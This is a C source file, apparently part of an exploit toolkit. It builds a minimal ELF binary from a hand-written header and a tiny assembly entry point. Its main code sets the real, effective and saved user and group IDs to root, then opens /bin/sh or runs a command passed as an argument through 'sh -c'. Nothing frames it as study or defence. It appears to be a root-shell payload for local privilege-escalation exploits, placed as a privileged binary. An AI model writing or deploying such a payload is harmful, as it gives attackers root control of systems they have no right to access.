#include "icrt_lib.h"
#include "icrt_syscall.h"

// =-=-=-= ELF header =-=-=-=
asm(".byte "
    "0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,"
    "0x00,0x00,0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x00,0x00,"
    "0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,"
    "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,"
    "0x01,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x07,0x00,"
    "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,"
    "0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x00,"
    "0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,"
    "0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00");

// =-=-=-= tiny loader =-=-=-=
asm(".intel_syntax noprefix; .globl	_start;");
asm("_start: mov rdi, [rsp]; lea rsi, [rsp+8];lea rdx, [rdi*8+rsi+8]; jmp "
    "_main;");
int main(int argc, char **argv, char **envp);
void _main(int argc, char **argv, char **envp) {
    sys_exit(main(argc, argv, envp));
}

// =-=-=-=-=-=-=-=-=-=-=-=-=
// =-=-=-= main code =-=-=-=
// =-=-=-=-=-=-=-=-=-=-=-=-=

static void pop_shell(char **envp) {
    char *p[2];
    p[0] = "sh";
    p[1] = NULL;
    sys_execve("/bin/sh", p, envp);
}

static void execute_command(char *cmd, char **envp) {
    char *p[4];
    p[0] = "sh";
    p[1] = "-c";
    p[2] = cmd;
    p[3] = NULL;
    sys_execve("/bin/sh", p, envp);
}

int main(int argc, char **argv, char **envp) {
    sys_setresuid(0, 0, 0);
    sys_setresgid(0, 0, 0);

    if (argc < 2) {
        pop_shell(envp);
    } else {
        execute_command(argv[1], envp);
    }

    return 0;
}
